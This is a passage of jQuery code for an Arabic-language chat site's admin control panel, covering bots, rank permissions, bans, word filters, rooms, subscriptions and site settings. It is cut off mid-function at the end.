"قبرص", "qa": "قطر", "kg": "قيرقيزستان", "kz": "كازاخستان", "nc": "كاليدونيا الجديدة", "kh": "كامبوديا", "hr": "كرواتيا", "ca": "كندا", "cu": "كوبا", "ci": "ساحل العاج", "kr": "كوريا", "kp": "كوريا الشمالية", "cr": "كوستاريكا", "co": "كولومبيا", "ki": "كيريباتي", "ke": "كينيا", "lv": "لاتفيا", "la": "لاوس", "lb": "لبنان", "li": "لشتنشتاين", "lu": "لوكسمبورج", "ly": "ليبيا", "lr": "ليبيريا", "lt": "ليتوانيا", "ls": "ليسوتو", "mq": "مارتينيك", "mo": "ماكاو", "fm": "ماكرونيزيا", "mw": "مالاوي", "mt": "مالطا", "ml": "مالي", "my": "ماليزيا", "yt": "مايوت", "mg": "مدغشقر", "eg": "مصر", "mk": "مقدونيا، يوغوسلافيا", "mn": "منغوليا", "mr": "موريتانيا", "mu": "موريشيوس", "mz": "موزمبيق", "md": "مولدوفا", "mc": "موناكو", "ms": "مونتسيرات", "me": "مونتينيغرو", "mm": "ميانمار", "na": "ناميبيا", "nr": "ناورو", "np": "نيبال", "ng": "نيجيريا", "ni": "نيكاراجوا", "nu": "نيوا", "nz": "نيوزيلندا", "ht": "هايتي", "hn": "هندوراس", "nl": "هولندا", "hk": "هونغ كونغ", "wf": "واليس وفوتونا" };
		if(powersarr.length==0){powers();}
		if(roomslist.length==0){rooms();}
		
		function getnameroom(data){
		if(roomslist.length > 0){
		const isrom = roomslist.findIndex((x)=> x.id == data)
		if(isrom != -1){
		return roomslist[isrom].topic;
		};
		};
		};
		function enterbot(data){
		$.get('cp.nd?cmd=enterbot&id='+data+'&token='+token,function(d){
		var data=JSON.parse(d);
				alert(data.msg)
		   bots();
		});
		};		
		
		function kickbot(data){
		$.get('cp.nd?cmd=deltbot&id='+data+'&token='+token,function(d){
		var data=JSON.parse(d);
		alert('تم حذف البوت')
		 bots();
		});
		};		
		
		function msgbots(data){
		if(data){
		   const msg = prompt("الرجاء كتابة رسالتك للغرفة " +"("+data.split(",")[1]+")");
			if (msg != null) {
			                $.get('cp.nd?cmd=sendmsgbot&id='+data.split(",")[0]+'&msg='+msg+'&token='+token,function(d){
							     alert('تم إرسال رسالة للغرفة')
							});
			};
			};
		};
		function bots(){
		if(powersarr.length==0){powers();}
		if(roomslist.length==0){rooms();}
		    $("#countrybot").empty();
		    $("#rankbot").empty();
		    $("#rommbot").empty();
		  $.each(ufc, function(key, value) {   
                $('#countrybot').append($("<option></option>").attr("value", key).text(value)); 
           });
		       
			    $('#rankbot').append($("<option></option>").attr("value", "").text(""));
		   	  $.each(powersarr, function(i, e) {   
                $('#rankbot').append($("<option></option>").attr("value", e.name).text(e.name)); 
           });
		   
		      	  $.each(roomslist, function(i, e) {   
                $('#rommbot').append($("<option></option>").attr("value", e.id).text(e.topic)); 
           });
		   
        $.get('cp.nd?cmd=bots&token='+token,function(d){
	    	var data=JSON.parse(d);
				if(data.err === true){
					$('#bots').text('لا تملك صلاحيات');return;
				}
				$('#bots .tablesorter').remove();
				var h=createTable(['الصورة','الاسم','الرتبة','الدولة','الغرفة','الاي بي','الحاله','رسائل','د/خ ','حذف']);
				$('#bots').append(h);
				$.each(data.msg,function(i,e){
				console.log(e);
					var btn="<a class='btn btn-primary fa fa-comments' onclick='msgbots(\""+e.id+","+getnameroom(e.room)+"\");'></a>";
					var btn1="<a class='btn btn-info' style='margin-right:10px;font-size:11px !important' onclick='enterbot(\""+e.id+"\");'>دخول/خروج</a> ";
					var btn2="<a class='btn btn-danger fa fa-trash' onclick='kickbot(\""+e.id+"\");'></a> ";
					tableAddhtm(h,["<img style='width:50px' src="+e.pic+">",e.topic,e.power,isflag(e.country),getnameroom(e.room),e.ip,e.msg,btn,btn1,btn2]); 
				});
				$('#bots .tablesorter').trigger("update") ;
				 readylogins(); 
				$(".tablesorter").each(function(ii,tp){
					$(tp).find('tr').each(function(i,e){
						if(i/2==Math.ceil(i/2)){
							$(e).css('background-color','#fffafa');
						}else{
							$(e).css('background-color','#fafaff');
						}
					});
				});
				});
		   
		};
		
		
		function powers(){
			$.get('cp.nd?cmd=powers&token='+token,function(d){
				var data=JSON.parse(d); 
				if(data.err === true){
					$('#powers').text('لا تملك صلاحيات');return;
				}
                var us = {rank: 999,name: "تلقائي",ico: "",kick: 9999,delbc: false,alert: false,mynick: false,unick: false,ban: false,publicmsg: 9999,forcepm: false,loveu: false,roomowner: false,createroom: false,rooms: 9999,edituser: false,meiut: false,ulike: false,flter: false,subs: false,shrt: false,msgs: false,bootedit: false,setpower: false,bnrpower:false,upgrades: 9999,history: false,cp: false,stealth: false,owner: false,grupes: false,grupess: false,editprofile: false,delpic: false,delmsg: false}
                if(data.length<=0)
				data.push(us)
				powersarr = data;
				$(".powerbox").children().remove();  
				powersarr.sort(function(a,b){return (b.rank||0) - (a.rank||0)});
				for (var i=0;i<powersarr.length;i++){
					$('.powerbox').each(function(ii,e){
					if(powersarr[i].name != "Hide"){
						var h=$("<option></option>");
						h.attr('value',powersarr[i].name);
						h.attr('class',powersarr[i].name.replace(/\s/g,''));
						h.text( '['+ (powersarr[i].rank||0) +'] '+ powersarr[i].name);
						$(e).append(h); 
						};
					});
					if(i==powersarr.length-1){
						var h=$("<option></option>");
						h.attr('value', '');
						h.text('');
						$('#tuser .powerbox').prepend(h);
					}
				}
				powerchange();
			});
			$.get('cp.nd?cmd=sico&token='+token,function(d){
				var icos=JSON.parse(d);
				//      if(icos.err === true){
				//        $('#powers').text('لا تملك صلاحيات');return;
				//      }
				$('.sico').children().remove();
				$.each(icos,function(i,e){
					var ht=$('<div style="display:inline-block;margin:8px" onclick="GetPowerSico(this,\''+e+ '\')"></div>');
					ht.prepend($('<img style="padding:4px;width:auto;height:30px" src="/sico/'+e+'">'));
					$('.sico').append(ht).append();
				});
			});
		}
		var evi;
		function GetPowerSico(ev,e){
		if(evi){
		$(evi).removeClass('activepower')
		};
		evi = ev;
		$(ev).addClass('activepower')
		$("input[name='ico']").val(e);
		};
		function powers_save(p){
			$.get('cp.nd?cmd=powers_save&token='+token+'&power='+JSON.stringify(p),function(d){
				var data=JSON.parse(d);
				if(data.err==true){
					alert(data.msg ==='noRank'? 'لا يمكنك رفع ترتيب المجموعه اعلى من ترتيب مجموعتك' : 'هذا الحساب محمي لايمكنك التعديل عليه');
				}
				else alert(data.msg); powers();
			})
		}
		function powers_delete(p){
			$.get('cp.nd?cmd=powers_del&token='+token+'&name='+encodeURIComponent(p.name),function(d){

				var data=JSON.parse(d);
				if(!data)alert('قم بتحديث الصفحة');
				if(data.err==true){
					alert(data.msg);
				}else{
					alert(data.msg);
					$('.selbox').find('.'+p.name.replace(/\s/g,'')).remove();
					//     powers();
				}
			})
		}
		
		function bans(){
		
				$.get('cp.nd?cmd=hostingr&token='+token,function(d){
				var e=JSON.parse(d);
				if(e.msg){
				$('#isvpn').text('(مثبت)');
				$('#isvpn').css('color','green');
				}else{
				$('#isvpn').text('(غير مثبت)');
				$('#isvpn').css('color','red');
				};
			});
			
			
			$.get('cp.nd?cmd=bans&token='+token,function(d){
				var data=JSON.parse(d); 
				if(data.err === true){
					$('#bans').text('لا تملك صلاحيات');return;
				}
				
					var ddd = data['system1'];
					var dddd = data['browser1'];
						for(i in ddd)$('#'+i).prop('checked',ddd[i]?true:false);
						for(i in dddd)$('#'+i).prop('checked',dddd[i]?true:false);
						bansIs();
				
			
		
		})
		};


function bansIs(){
			$.get('cp.nd?cmd=bansU&token='+token,function(d){
			var data=JSON.parse(d); 
				if(data.err === true){
					$('#bans').text('لا تملك صلاحيات');return;
				}
				$('#bans .tablesorter').remove();
				var h=createTable( "العضو,الجهاز,الاي بي,السبب,ينتهي في, الحالة".split(','));
				$('#bans').append(h);
				$.each(data,function(i,e){
					var btn="<a class='btn btn-danger fa fa-times' onclick='unban(\""+e.id+"\");'>";
					tableAdd(h,[e.name_band, e.device_band || e.country_band || e.decoderDans, e.ip_band,e.type,new Date(Number(e.date)).toDateString()],e.id,btn); 
					});
				$('#bans .tablesorter').trigger("update");
				$(".tablesorter").each(function(ii,tp){
					$(tp).find('tr').each(function(i,e){
						if(i/2==Math.ceil(i/2))$(e).css('background-color','#fffafa');
						else $(e).css('background-color','#fafaff');
					});
				});
			});
			
}
		function banit(type){
			if(type=='' || type=='null'){return;}
			$('.banit').val('');
			$.get('cp.nd?type='+ encodeURI(type)+'&cmd=ban&token='+token,function(data){
			bansIs();
			});
		}
		function banit2(type){
			if(type=='' || type=='null'){return;}
			$('.banit2').val('');
			$.get('cp.nd?type='+ encodeURI(type)+'&cmd=ban&token='+token,function(data){
			bansIs();
			});
		}
		function decoderDans(df){
			var id = df.id;

			var prco = 'null'
			if(!df.decoderDans)prco = prompt('ادخل الدولة التي تريد نشفير المستخدم فيها ');

			if(prco){
				$.get('cp.nd?id='+id+'&co='+prco+'&cmd=decoderDans&token='+token,function(d){
					var add = $('#bans>.tablesorter>tbody>#'+id);
					var e=JSON.parse(d); 
					if(e&&!e.err){

						var onclick='decoderDans({id:"'+e.id+'",decoderDans:'+e.decoderDans+'});'
						add.find('.dec').text(e.decoderDans?'فك التشفير':'تشفير').css((e.decoderDans?{background: '#258c05',borderColor: '#258c05'}:{background: '',borderColor: ''})).attr('onclick',onclick);
						var ss = add.find('td');
						$(ss[0]).text(e.user);
						$(ss[2]).text(e.date);
					}else{
						alert(e.msg)
						$('#bans>.tablesorter>tbody>#'+id).remove()
					}
				});
			}else{
				alert('تاكد من ادخال التشفير بالطريقة الصحيحة')

			}

		}
		function unban(id){
			$.get('cp.nd?id='+id+'&cmd=unban&token='+token,function(d){
				$('#bans>.tablesorter>tbody>#'+id).remove()
			});  
		}
		
		function fltr(){
			$.get('cp.nd?cmd=fltr&token='+token,function(d){
				var data=JSON.parse(d); 
				if(data.err === true){
					$('#fltr').text('لا تملك صلاحيات');return;
				}
				$('#fltr .tablesorter').remove();
				var h=createTable( "التصنيف,الكلمه,حذف".split(','));
				$("#fltr").append(h);
				$.each(data,function(i,e){
					var btn="<a class='btn btn-danger fa fa-times' onclick='fltrdel(\""+e.v+"\",\""+e.id+"\");'></a>";
					tableAdd(h,[e.type,e.v,btn],e.id);
				});
				$('#fltr .tablesorter').trigger("update") ;
				$(".tablesorter").each(function(ii,tp){
					$(tp).find('tr').each(function(i,e){
						if(i/2==Math.ceil(i/2)){
							$(e).css('background-color','#fffafa');
						}else{
							$(e).css('background-color','#fafaff');
						}

					});
				});
			});
			$.get('cp.nd?cmd=fltred&token='+token,function(d){
				var data=JSON.parse(d); 
				if(data.err!=null){
					$('#fltr').text('لا تملك صلاحيات');return;
				}
				$('#fltred').html(''); 
				for(var i=data.length-1;i!=-1;i--){
					var e=data[i];
					$("#fltred").append('<label class="fl label label-primary">الكلمه</label>'+e.v+'<br><div class="fl border" style="width:100%;">'+e.msg+'<br>user: '+e.topic.split('&').join('&amp;')+'<br>IP: '+e.ip+'</div><br>');
				}
			});
		}
		function fltrit(path,v){
		if(v.trim()){
			$.get('cp.nd?cmd=fltrit&token='+token+'&path='+path+'&v='+v,function(d){
				var e=JSON.parse(d);
				if(e.err===true){
					$('#fltr').text('لا تملك صلاحيات');
				}else{
					var btn="<a class='btn btn-danger fa fa-times' onclick='fltrdel(\""+e.v+"\",\""+e.id+"\")'></a>"
					var tr =`<tr id="`+e.id+`"><td>`+e.type+`</td><td>`+e.v+`</td><td>`+btn+`</td></tr>`
					$('#fltr>.tablesorter>tbody').prepend(tr);
					$('#fltr>input').val('')
				}
			});
			}else{
			    alert('الرجاء إظافة كلمة')
			};
		}
		function fltrdel(v,id){
			$.get('cp.nd?cmd=fltrdel&token='+token+'&v='+v+'&id='+id,function(d){ 
				$('#fltr>.tablesorter>tbody>#'+id).remove()
			});
		}
		
		function roomsdel(id){
			$.get('cp.nd?cmd=roomsdel&token='+token+'&id='+id,function(d){
				var data=JSON.parse(d);
				if(data){
					alert(data.msg);
					if(data.err===true){
					}else{
					$('#rooms>.tablesorter>tbody>#'+id).remove()
					};
				}
			}); 
		}		
		
		function roomsver(id){
		var dfs = $('#rooms>.tablesorter>tbody>#'+id+' a.chekedroom')
			if(dfs.attr('disabled'))return alert('الغرفة محددة بلفعل');
		
			$.get('cp.nd?cmd=roomsver&token='+token+'&id='+id,function(d){
				var data=JSON.parse(d);
				if(data){
					alert(data.msg);
					rooms();
				};
			}); 
		}
		
		function roomspic(id){
			sendfile('.'+id,function(file){
				var f=JSON.parse(file);
				if(f&&f.error)return alert(d.msg)
				$.get('cp.nd?cmd=roomspic&token='+token+'&pic='+f.msg+'&id='+id,function(d){
					var data=JSON.parse(d);
					if(data.err===true){
						alert(data.msg)
						return;
					}
					$('#rooms>.tablesorter>tbody>#'+id+' img').attr('src','/'+data.msg)
				}); 
			});
		}
		
		function roomspicdel(id){
			var sdf = $('#rooms>.tablesorter>tbody>#'+id+' img')
			if(sdf.attr('src')=='room.png'|| sdf.attr('src')=='/room.png')return alert('الغرفه تحتوي على الصورة الافتراضية بالفعل ');
			$.get('cp.nd?cmd=roomspicdel&token='+token+'&pic=room.png&id='+id,function(d){
				var data=JSON.parse(d);
				if(data.err===true){
					alert(data.msg)
					return;
				}
				sdf.attr('src','/'+data.msg)
			}); 
		}
		
		function roomdelpass(id){
			var dfs = $('#rooms>.tablesorter>tbody>#'+id+' a.passDelete')
			if(dfs.attr('disabled'))return alert('الغرفة لا تحتوي على كلمة مرور');
			$.get('cp.nd?cmd=roompass&token='+token+'&id='+id,function(d){
				var data=JSON.parse(d);
				if(data.err===true){
					alert(data.msg)
					return;
				}
				alert(data.msg)
				dfs.attr('disabled',true);
			}); 
		}

		function rooms(){
			$.get('cp.nd?cmd=rooms&token='+token,function(d){
				var data=JSON.parse(d); 
				if(data.err===true){
					$('#rooms').text('لا تملك صلاحيات');return;
				}

				$('#rooms .tablesorter').remove();
				var h=createTable( "الغرفة,صاحب الغرفه,الصورة,تغيير الصورة,حذف الصورة,تحديد غرفة,حذف الغرفة,كلمة السر".split(','));
				$("#rooms").append(h);
				roomslist = data.msg;
				$.each(data.msg,function(i,e){


					var sfd = `<div><table style="width: 100%;" class="table table-bordered"">
<thead><tr><tr><tr><tr><tr><tr>
		</tr>
		</thead>
<tbody class='rrrr'>
<tr >
<td style="min-width: 130px;"><img style="max-width:64px;max-height:64px;min-height: 30px;" class="fl r`+e.id+`" src="`+'/'+e.pic+`"><a style="margin-bottom: 2px;" class='btn btn-info fa fa-photo fr ' onclick='roomspic("`+e.id+`");'>تغير</a><br><a class='fr btn btn-danger fa fa-times m'  onclick='roomspicdel("`+e.id+`");'></a>
<a `+(e.needpass?'': 'disabled')+` class='passDelete fr btn btn-danger fa fa-times t ' onclick='roomdelpass("`+e.id+`");'></a>
<a class=' btn btn-danger fa fa-times r' onclick='roomsdel("`+e.id+`");'>حذف الغرفة</a>
<a `+(data.data != e.id ? '': 'disabled')+` class='chekedroom btn btn-info fa fa-check' onclick='roomsver("`+e.id+`");'> </a>
		</tr>
		</tbody>
		</table></div>
`

					var btn=`<a class='btn btn-danger fa fa-times' onclick='roomsdel("`+e.id+`");'></a>`;
					var rpic=`<img style="max-width:64px;max-height:64px;" class="r`+e.id+`" src="`+e.pic+`"><a class='btn btn-info fa fa-photo' onclick='roomspic("`+e.id+`");'></a>`;
					var rpic2="<a class='btn btn-info fa fa-photo' onclick='roomspic(\""+e.id+"\");'></a>";
					tableAdd(h,[e.topic,e.user,sfd],e.id); 
				});
				$('#rooms .tablesorter').trigger("update") ;
				$(".tablesorter").each(function(ii,tp){
					$(tp).find('tr').each(function(i,e){
						if(i/2==Math.ceil(i/2))$(e).css('background-color','#fffafa');
						else $(e).css('background-color','#fafaff');
					});
				});
			}); 
		}
		
		function shrt(){
			$.get('cp.nd?cmd=shrt&token='+token,function(d){
				var data=JSON.parse(d); 
				if(data.err === true){
					$('#shrt').text('لا تملك صلاحيات');return;
				}
				$('#shrt .tablesorter').remove();
				var h=createTable( "الإختصار,الزخرفه,حذف".split(','));
				$("#shrt").append(h);
				$.each(data,function(i,e){

					var btn="<a class='btn btn-danger fa fa-times' onclick='shrtdel(`"+e.id+"`);'></a>";
					tableAdd(h,[e.text1,e.text2,btn],e.id);
				});
				$('#shrt .tablesorter').trigger("update") ;
				$(".tablesorter").each(function(ii,tp){
					$(tp).find('tr').each(function(i,e){
						if(i/2==Math.ceil(i/2))$(e).css('background-color','#fffafa');
						else $(e).css('background-color','#fafaff');
					});
				});
			}); 
		}
		function shrtadd(){
			var name=$('.shrtname').val();
			var value=$('.shrtvalue').val();
			if(name==''){alert('يرجى كتابه إختصار او زخرفه');return;}
			$.get('cp.nd?cmd=shrtadd&token='+token+'&name='+encodeURIComponent(name)+'&value='+encodeURIComponent(value),function(d){

				var e=JSON.parse(d);
				if(e.err===true){
					$('#fltr').text('لا تملك صلاحيات');
				}else{
					var btn="<a class='btn btn-danger fa fa-times' onclick='shrtdel(\""+e.id+"\");'></a>";
					var tr =`<tr id="`+e.id+`"><td>`+e.text1+`</td><td>`+e.text2+`</td><td>`+btn+`</td></tr>`
					$('#shrt>.tablesorter>tbody').prepend(tr);
					$('#shrt>input').val('')
				}

			}); 
		}
		function shrtdel(id){
			$.get('cp.nd?cmd=shrtdel&token='+token+'&id='+encodeURIComponent(id),function(d){
				$('#shrt>.tablesorter>tbody>#'+id).remove()
			}); 
		}
		
		
		function lastssens(data){
		if(data){
		var d = new Date().getTime() ;
		const isindex = data.users.findIndex((x) => x.idreg == data.user);
		if(isindex != -1){
		return (new Date(d - data.users[isindex].lastssen ).getTime() ).time();
		}else{
		return moment().format("hh:mm:ss");
		};
		};
		};


function getDayTime(st1,st2){	
const st = moment();
const st0 = moment(Number(st2));
return st0.diff(st, "days")

};


		function subs(){
			$.get('cp.nd?cmd=subs&token='+token,function(d){
				var data=JSON.parse(d);
				 console.log(data.powers); 
				if(data.err === true){
					$('#subs').text('لا تملك صلاحيات');return;
				}
                var nsubs = data.data.sub?data.data.sub:data.data;
                if(data.powers){
                    for(var i=0;i<nsubs.length;i++){
                        var it = nsubs[i];
                        var ip = data.powers.filter((item)=>item.name === it.sub)[0]
                        if(ip){
                            nsubs[i].sub = ' ['+ip.rank.toString()+'] '+it.sub
                            nsubs[i].rank = ip.rank
                        }
                    }
                 nsubs = nsubs.sort(function (a, b) {return a.rank < b.rank ? 1 : -1}) 
                   nsubs =  nsubs.sort(function(a,b){return (b.rank||0) - (a.rank||0)});

                }
                loginsarr=nsubs
				$('#subs .tablesorter').remove();
				var h=createTable('الإشتراك,العضو,الزخرفه,المده,الايام المتبقيه,اخر تواجد,'.split(','));
				$('#subs').append(h);
				$.each(nsubs,function(i,e){	
				if(e.sub && !e.sub.includes("Hide") && !e.sub.includes("ssssssss2s")){				
					var btn="<a class='btn btn-primary fa fa-times' onclick='set_power(\""+e.iduser+"\",\"\",\"0\");'></a>"; 
					tableAdd(h,[e.sub,e.topic1,e.topic,e.timeis,getDayTime(e.timestart,e.timefinish),lastssens({users:data.users,user:e.iduser}),btn]);  
					};
				});
				$('#subs .tablesorter').trigger("update") ;
				$(".tablesorter").each(function(ii,tp){
					$(tp).find('tr').each(function(i,e){
						if(i/2==Math.ceil(i/2))$(e).css('background-color','#fffafa');
						else $(e).css('background-color','#fafaff');
					});
				});
			});
		}
		
		function set_power(id,power,days){
			$.get('cp.nd?cmd=setpower&token='+token+'&id='+id+'&power='+encodeURIComponent(power)+'&days='+days,function(  d){
				var jq = JSON.parse(d);
				alert(jq.msg);
				subs();
			}); 
		}
		
		function msgs(){
			$.get('cp.nd?cmd=msgs&token='+token,function(d){
				var data=JSON.parse(d); 
				if(data.err === true ){
					$('#msgs').text('لا تملك صلاحيات');return;
				}
				$('#msgs .tablesorter').remove();
				var h=createTable( "التصنيف,العنوان,الرساله,".split(','));
				$("#msgs").append(h);
				$.each(data,function(i,e){
					var btn="<a class='btn btn-danger fa fa-times' onclick='msgsdel(\""+e.id+"\",\""+e.category+"\");'></a>";
					tableAdd(h,[e.category=="w"? 'الترحيب' : 'الرسائل',e.adresse,e.msg,btn]); 
				});
				$('#msgs .tablesorter').trigger("update").css('width','380px').find('tbody tr').css('max-width',"120px") ;
				$(".tablesorter").each(function(ii,tp){
					$(tp).find('tr').each(function(i,e){
						if(i/2==Math.ceil(i/2))$(e).css('background-color','#fffafa');
						else $(e).css('background-color','#fafaff');
					});
				});
			});
		}
		function msgsit(type,t,m){
			$.get('cp.nd?cmd=msgsit&token='+token+'&type='+type+'&t='+encodeURIComponent(t) + "&m=" + encodeURIComponent(m),function(d){ 
				var e=JSON.parse(d);

				if(e.err===true){
					$('#msgs').text('لا تملك صلاحيات');
				}else{
					var btn="<a class='btn btn-danger fa fa-times' onclick='msgsdel(\""+e.id+"\",\""+e.category+"\");'></a>";
					var tr =`<tr><td>`+(e.type==="w"? 'الترحيب' : 'الرسائل')+`</td><td>`+e.adresse+`</td><td>`+e.msg+`</td><td>`+btn+`</td></tr>`
					$('#msgs>.tablesorter>tbody').prepend(tr);
					$('#msgs>input,#msgs>textarea').val('')
				}
			});
		}
		function msgsdel(id,type){
			$.get('cp.nd?cmd=msgsdel&token='+token+'&id='+id+'&type='+type,function(d){
				msgs(); 
			});
		}

			function toEnglishDigits(str) {
    var e = "۰".charCodeAt(0);
    str = str.replace(/[۰-۹]/g, function (t) {
        return t.charCodeAt(0) - e;
    });
    e = "٠".charCodeAt(0);
    str = str.replace(/[٠-٩]/g, function (t) {
        return t.charCodeAt(0) - e;
    });
    return str;
}
		function hostin(){
		  $.get('cp.nd?cmd=hosting&token='+token,function(d){
				var e=JSON.parse(d);
				$('#dtfi').val(toEnglishDigits(moment(e.tf).format('YYYY-MM-DD')));
				$('#gust').text('عدد الزوار : '+e.g);
				$('#users').text('عدد المستخدمين : '+e.u);
				$('#vistor').text('عدد مشاهدين الموقع :'+e.v);
				if(e.msg){
				$('#isbar').text('(مثبت)');
				$('#isbar').css('color','#4caf50');
				$('#isbar').css('font','icon');
				}else{
				$('#isbar').text('(غير مثبت)');
				$('#isbar').css('color','#ff0000');
				$('#isbar').css('font','icon');
				};
			});
		

	  $.get('cp.nd?cmd=databaseinfo&token='+token,function(d){
	var ed=JSON.parse(d);
	$(".databaseis").empty();
	 $.each(ed.msg,function(i,e){
     $(".databaseis").append('<tr><td style="padding:5px">#'+i+'</td><td style="padding:5px">'+e.replace('.sql','').replace('database','')+'</td><td style="padding:5px"><button disabled onclick="dbstate({id:\''+e+'\',state:1})" class="btn btn-danger"><i style="width: 48px; padding: 0 17px;" class="fa fa-trash"></i></button> <button onclick="dbstate({id:\''+e+'\',state:2})"  class="btn btn-info"><i style="width: 48px; padding: 0 17px;" class="fa fa-plus"></i></button></td></tr>')
       });
       });
			
			$.get('cp.nd?cmd=hostnames&token='+token,function(d){
			$('#hostname').empty()
			$('#hostnames').empty()
				var e=JSON.parse(d);
			    if(e.power == 'Hide'){
				  $('#isdmon').css('display','block')
				};
				if(e.err){
				for(var i=0;i<e.msg.length;i++){
				$('#hostname').append("<option value='"+e.msg[i].setting+"'>"+e.msg[i].hostname+"</option>")
				$('#hostnames').append("<option value='"+e.msg[i].setting+"'>"+e.msg[i].hostname+"</option>")
				};
				};
			});
			
			  $.get('cp.nd?cmd=hostinge&token='+token,function(d){
				var e=JSON.parse(d);
				if(e.msg){
				$('#isuser').text('(مثبت)');
				$('#isuser').css('color','#4caf50');
				$('#isuser').css('font','icon');
				}else{
				$('#isuser').text('(غير مثبت)');
				$('#isuser').css('color','#ff0000');
				$('#isuser').css('font','icon');
				};
			});
			
			  $.get('cp.nd?cmd=bnr&token='+token,function(d){
				var e=JSON.parse(d);
				if(e.msg){
				$('#isbnr').text('(مفعل)');
				$('#isbnr').css('color','#4caf50');
				$('#isbnr').css('font','icon');
				}else{
				$('#isbnr').text('(غير مفعل)');
				$('#isbnr').css('color','#ff0000');
				$('#isbnr').css('font','icon');
				};
			});
			
			$.get('cp.nd?cmd=bnr1&token='+token,function(d){
				var e=JSON.parse(d);
				if(e.msg){
				$('#isbnr1').text('(مفعل)');
				$('#isbnr1').css('color','#4caf50');
				$('#isbnr1').css('font','icon');
				}else{
				$('#isbnr1').text('(غير مفعل)');
				$('#isbnr1').css('color','#ff0000');
				$('#isbnr1').css('font','icon');
				};
			});
			
			$.get('cp.nd?cmd=bnr2&token='+token,function(d){
				var e=JSON.parse(d);
				if(e.msg){
				$('#isbnr2').text('(مفعل)');
				$('#isbnr2').css('color','#4caf50');
				$('#isbnr2').css('font','icon');
				}else{
				$('#isbnr2').text('(غير مفعل)');
				$('#isbnr2').css('color','#ff0000');
				$('#isbnr2').css('font','icon');
				};
			});$.get('cp.nd?cmd=bnr3&token='+token,function(d){
				var e=JSON.parse(d);
				if(e.msg){
				$('#isbnr3').text('(مفعل)');
				$('#isbnr3').css('color','#4caf50');
				$('#isbnr3').css('font','icon');
				}else{
				$('#isbnr3').text('(غير مفعل)');
				$('#isbnr3').css('color','#ff0000');
				$('#isbnr3').css('font','icon');
				};
			});
			
			$.get('cp.nd?cmd=bnr4&token='+token,function(d){
				var e=JSON.parse(d);
				if(e.msg){
				$('#isbnr4').text('(مفعل)');
				$('#isbnr4').css('color','#4caf50');
				$('#isbnr4').css('font','icon');
				}else{
				$('#isbnr4').text('(غير مفعل)');
				$('#isbnr4').css('color','#ff0000');
				$('#isbnr4').css('font','icon');
				};
			});
			  $.get('cp.nd?cmd=rc&token='+token,function(d){
				var e=JSON.parse(d);
				if(e.msg){
				$('#isrc').text('(مفعل)');
				$('#isrc').css('color','#4caf50');
				$('#isrc').css('font','icon');
				}else{
				$('#isrc').text('(غير مفعل)');
				$('#isrc').css('color','#ff0000');
				$('#isrc').css('font','icon');
				};
			});


	  $.get('cp.nd?cmd=tvtv&token='+token,function(d){
				var e=JSON.parse(d);
			$('#tvurl').val(e.msg);
			});	 		

	  $.get('cp.nd?cmd=mxpr&token='+token,function(d){
				var e=JSON.parse(d);
			$('#Numberep').val(e.msg);
			});				


		
		}

		
function dbstate(data){
var statedb = '';
if(data.state == 1){
statedb = data.id+' هل انت متأكد من حذف قاعدة البيانات'
}else if(data.state == 2){
statedb = data.id+' هل انت متأكد من إسترجاع قاعدة البيانات'
};
const iscon = confirm(statedb);
if(iscon){
  $.get('cp.nd?cmd=iscondb&token='+token+'&data='+data.id+'&state='+data.state,function(d){
		var e=JSON.parse(d);
  	    alert(e.msg)
		hostin()
	 });	
};
}
		function getwalllikes(){
			var op = {};
			var len = 0;
			var s = ['likeMsgRoom','likeTopicEdit' ,'likeUpPic','likeUpImgBc','lengthMsgRoom','lengthMsgPm','lengthMsgBc','lengthUserReg','lengthUserG'];
			for(var i=0;i<s.length; i++){
				var ihtml = $('.'+s[i]).css('display')
				if(ihtml != 'none' && $('.'+s[i]+' input').val()!==''){
					op[s[i]] = $('.'+s[i]+' input').val();
					len = len+1
				}
			}
			if(len>0){
				op.bclikes = $('.wall_likes').val()
				op = JSON.stringify(op);
			}else{
				op = $('.wall_likes').val()
			}
			return op
		}

		function setwalllikes(s){
			if(!s)return;
			try{
				var jsonpr = typeof s=== "object"? s : JSON.parse(s);
				if(typeof jsonpr === "object" ){
					for(var i in jsonpr){
						var htmlv=$('.'+i)
						if(htmlv.length>0){
							htmlv.find('input').val(jsonpr[i]).parent().show();
						}
					}
					return jsonpr.walllikes || 0
				}else if(typeof jsonpr === "number" || typeof jsonpr === "string"){
					return s;
				}else{
					return 10;
				}
			}
			catch(er){
				return s
			}
		}
        
var isstting = 1;
$( "#hostnames" ).change(function () {
    var str = "";
    $( "#hostnames option:selected" ).each(function() {
      str += $( this ).val();
    });
	isstting = str;
   sett(str);
  })

	$.get('cp.nd?cmd=hostnames&token='+token,function(d){
			$('#hostnames').empty()
				var e=JSON.parse(d);
				if(e.err){
				for(var i=0;i<e.msg.length;i++){
				$('#hostnames').append("<option value='"+e.msg[i].setting+"'>"+e.msg[i].hostname+"</option>")
				};
				};
			});
			
		function sett(dom){
		
			$.get('cp.nd?cmd=owner&domin='+dom+'&token='+token + '&rnd='+ new Date().getTime().toString(),function(d){
				var data=JSON.parse(d)[0];
				var data1=JSON.parse(d)[1];
				if(data.err === true){
					$('#sett').text('لا تملك صلاحيات');return;
				}
				data.site = JSON.parse(data.site);
				setwalllikes(data.site.walllikes)
				$(".chatfinish").text(moment(data1.finish).format('YYYY/MM/DD')+' : تاريخ إنتهاء الأشتراك');
				$('.p-banner').attr('src','/site/'+data1.banner);
				$('.p-pmpic').attr('src','/site/'+data1.pmpic);
				$('.p-prvpic').attr('src','/site/'+data1.prvpic);
				$('.p-prv2pic').attr('src','/site/'+data1.prv2pic);
				$('.p-prv3pic').attr('src','/site/'+data1.prv3pic);
				$('.p-storpic').attr('src','/site/'+data1.storpic);
				$('.p-logo').attr('src','/site/'+data1.logo);
				$('#sett_name').val(data1.name);
				$('#sett_title').val(data1.title);
				$('#sett_description').val(data1.settdescription);
				$('#sett_keywords').val(data1.settkeywords);
				$('#sett_scr').val(data1.settscr);
				$('.wall_likes').val(data.site.bclikes || 0);
				$('.wall_minutes').val(data.site.wallminutes||0);
				$('.pmlikes').val(data.site.pmlikes||0);
				$('.miclikes').val(data.site.miclikes||0);
				$('.msgstt').val(data.site.msgst||5);
				$('.notlikes').val(data.site.notlikes||0);
				$('.fileslikes').val(data.site.fileslikes||0);
				$('.allowg').prop('checked',data.site.allowg == true);
				$('.allowreg').prop('checked',data.site.allowreg == true); 
				var picker = new jscolor.color($('.sbg')[0], {}); 
				picker.fromString(data.site.bg);
				picker=new jscolor.color($('.sbackground')[0], {});
				picker.fromString(data.site.background);
				picker=new jscolor.color($('.sbuttons')[0], {});
				picker.fromString(data.site.buttons); 
				var pico=$('.p-sico'); 
